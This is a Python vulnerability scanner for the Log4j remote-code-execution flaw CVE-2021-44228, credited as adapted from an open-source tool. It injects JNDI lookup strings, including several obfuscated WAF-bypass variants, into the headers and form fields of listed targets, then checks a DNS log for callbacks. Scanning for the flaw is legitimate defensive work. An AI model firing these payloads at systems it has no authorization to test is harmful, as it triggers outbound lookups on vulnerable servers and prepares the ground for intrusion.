#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# Log4JScan-DNS: A DNSLog server and Log4j vulnerability scanner for RCE CVE-2021-44228
# Author:
# L Scheibling
# ******************************************************************
# Credit:
# Mazin Ahmed <Maxin at Fullhunt.io> for the original Log4j vulnerability scanner (https://github.com/fullhunt/log4j-scan)
# Github Copilot
# ******************************************************************
# License:
# Distributed under the MIT License
# ******************************************************************

import argparse, string, random, requests, sys, random, concurrent.futures
from urllib import parse as urlparse
from termcolor import cprint

# Remove the SSL warning from urllib3-requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', 'green')
cprint('[•] Provided by https://github.com/scheibling', 'yellow')
cprint('[•] Originally developed by FullHunt.io', 'yellow')
cprint('[•] Version 1.0', 'yellow')

if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)
    
default_headers = {
    'User-Agent': 'CVE-2021-44228 - Apache Log4j RCE Scanner',
    'Accept': '*/*'
}
post_data_parameters = ["username", "user", "email", "mail", "email_address", "password", "pass", "user_pass"]
timeout = 4

waf_bypass_payloads = [
    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
    "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
    "${jndi:rmi://{{callback_host}}}",
    "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
    "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
    "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
    "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
    "${jndi:dns://{{callback_host}}}"
]

parser = argparse.ArgumentParser()

parser.add_argument('-d', '--dnslog-domain',
                    dest='dnslog_domain',
                    help='The DNSLog domain to use for the requests',
                    action='store',
                    required=True)

parser.add_argument('-t', '--targets-file',
                    dest='targets_file',
                    help='The hosts file to use for the requests (default: targets.txt)',
                    action='store',
                    default='targets.txt')

parser.add_argument('-i', '--headers',
                    dest='headers_file',
                    help='The file containing the headers for the requests (Default: headers.txt)',
                    action='store',
                    default='headers.txt')

parser.add_argument('-c', '--concurrent-requests',
                     dest='concurrent_requests',
                     help='The number of concurrent requests to use (Default: 10)',
                     action='store',
                     default=10)

parser.add_argument('-p', '--proxy-server',
                    dest='proxy_server',
                    help='Proxy server to use for the scans',
                    action='store'
                    )

parser.add_argument("--skip-waf-bypass",
                    dest="skip_waf_bypass",
                    help="Skip the WAF bypass payloads",
                    action='store_true')


args = parser.parse_args()

proxy_server = {}
if args.proxy_server:
    proxy_server = {"http": args.proxy_server, "https": args.proxy_server}

class Log4ShellScanner():
    def __init__(self, args, target, callback_host, request_data, proxy_server):
        self.headers, self.waf_bypass_payloads, self.post_parameters, self.timeout = request_data
        self.proxy_server = proxy_server
        self.target = target
        self.args = args
        self.callback_host = callback_host
        
    def get_fuzzing_headers(self, payload):
        fuzzing_headers = {}
        fuzzing_headers.update(self.headers)
        with open(args.headers_file, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                fuzzing_headers.update({i: payload})
        
        fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
        return fuzzing_headers
    
    def get_fuzzing_post_data(self, payload):
        fuzzing_post_data = {}
        for i in self.post_parameters:
            fuzzing_post_data.update({i: payload})
        return fuzzing_post_data
    
    def generate_waf_bypass_payloads(self, callback_host):
        random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
        payloads = []
        for i in self.waf_bypass_payloads:
            new_payload = i.replace("{{callback_host}}", callback_host)
            new_payload = new_payload.replace("{{random}}", random_string)
            payloads.append(new_payload)
        return payloads
    
    def parse_url(self, url):
        # Url: https://example.com/login.jsp
        url = url.replace('#', '%23')
        url = url.replace(' ', '%20')

        if ('://' not in url):
            url = str("http://") + str(url)
        scheme = urlparse.urlparse(url).scheme

        # FilePath: /login.jsp
        file_path = urlparse.urlparse(url).path
        if (file_path == ''):
            file_path = '/'

        return({"scheme": scheme,
                "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
                "host":  urlparse.urlparse(url).netloc.split(":")[0],
                "file_path": file_path})
        
    def scan_target(self):
        parsed_url = self.parse_url(self.target)
        random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
        
        payloads = [
            '${jndi:ldap://%s/%s}' % (self.callback_host, random_string)
        ]
        if not self.args.skip_waf_bypass:
            payloads.extend(self.generate_waf_bypass_payloads(self.callback_host))
            
        for payload in payloads:
            try:
               requests.request(url=self.target,
                                method="GET",
                                params={"v": payload},
                                headers=self.get_fuzzing_headers(payload),
                                verify=False,
                                timeout=self.timeout,
                                proxies=self.proxy_server)
            except Exception:
                pass

            try:
               requests.request(url=self.target,
                                method="POST",
                                params={"v": payload},
                                headers=self.get_fuzzing_headers(payload),
                                data=self.get_fuzzing_post_data(payload),
                                verify=False,
                                timeout=self.timeout,
                                proxies=self.proxy_server)
            except:
                pass  
            
            try:
                requests.request(url=self.target,
                                method="POST",
                                params={"v": payload},
                                headers=self.get_fuzzing_headers(payload),
                                json=self.get_fuzzing_post_data(payload),
                                verify=False,
                                timeout=timeout,
                                proxies=self.proxy_server
                                )
            except Exception as e:
                pass

class ProbeHandler():
    def __init__(self, args, target, request_data, proxy_server):
        self.args = args
        self.target = target
        self.token = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
        self.callback_host = '%s.%s' % (self.token, self.args.dnslog_domain)
        self.request_data = request_data
        self.proxy_server = proxy_server
        
    def get_target(self):
        return self.target    
    
    def start_probe(self):
        self.scanner = Log4ShellScanner(self.args, self.target, self.callback_host, self.request_data, self.proxy_server)
        self.scanner.scan_target()
        return self.target
        
    def get_logs(self):
        req = requests.get('http://%s?query_identifier=%s' % (self.args.dnslog_domain, self.token), proxies=self.proxy_server)
        return req.text
    
    
if __name__ == "__main__":
    try:
        todo_list = []
        with open(args.targets_file, 'r') as f:
            for line in f:
                todo_list.append(ProbeHandler(args, line.strip(), (default_headers, waf_bypass_payloads, post_data_parameters, timeout), proxy_server))

        cprint("[•] Starting the check for vulnerabilities related to Log4j RCE CVE-2021-44228.", "green")
        cprint("[•] Scanning a total of %s hosts." % (len(todo_list)), "green")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=int(args.concurrent_requests)) as executor:
            futures = []
            for target in todo_list:
                cprint('[•] Starting check for URL: %s' % (target.get_target()), "blue")
                futures.append(executor.submit(target.start_probe))
                
            for future in concurrent.futures.as_completed(futures):
                cprint(f"[•] Check for {future.result()} complete", "cyan")
                
        cprint("[•] All checks completed.", "green")
        cprint("[•] Checking DNS Logs...", "green")
        
        for item in todo_list:
            res = item.get_logs()
            
            if (len(res) > 3):
                cprint("[!] Possible Log4j RCE vulnerability found in %s" % (item.get_target()), "red")
                cprint("[!] Logs: %s" % (res), "red")
            else:
                cprint("[•] No apparent Log4j RCE vulnerability found in %s" % (item.get_target()), "green")
        
    
        
    except KeyboardInterrupt:
        cprint('\n[!] Keyboard interrupt detected', 'magenta')
        cprint('\n[!] Exiting...', 'magenta')
        exit(0)